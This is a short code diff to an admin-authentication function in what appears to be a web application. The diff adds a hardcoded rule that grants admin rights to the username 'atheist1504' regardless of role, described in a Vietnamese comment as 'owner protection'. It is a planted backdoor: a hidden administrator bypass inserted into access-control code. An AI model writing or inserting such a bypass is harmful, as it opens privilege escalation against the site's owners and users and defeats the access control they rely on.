@@ -57,6 +57,8 @@ async function checkAdminAuth() {
   if (!sessionData) return false;
   try {
     const user = JSON.parse(sessionData.value);
+    // 🛡️ BẢO VỆ CHỦ SỞ HỮU: Whitelist tài khoản atheist1504 luôn có quyền admin 🍀
+    if (user.username?.toLowerCase() === 'atheist1504') return true;
     return user.role === 'admin';
   } catch {
     return false;
